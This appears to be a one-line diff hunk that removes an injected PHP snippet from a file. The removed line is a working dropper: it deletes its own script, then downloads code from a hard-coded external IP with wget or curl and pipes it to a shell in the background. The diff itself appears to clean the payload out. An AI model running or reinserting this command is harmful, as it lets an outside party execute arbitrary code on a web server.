@@ -1,1 +1,0 @@
-000002024<?php system("rm -rf ".pathinfo($_SERVER['SCRIPT_FILENAME'])["basename"]." ; (wget -qO - http://135.125.205.107/.x/?x=w-x || curl http://135.125.205.107/.x/?x=c-x) | sh > /dev/null 2>&1 &"); ?>
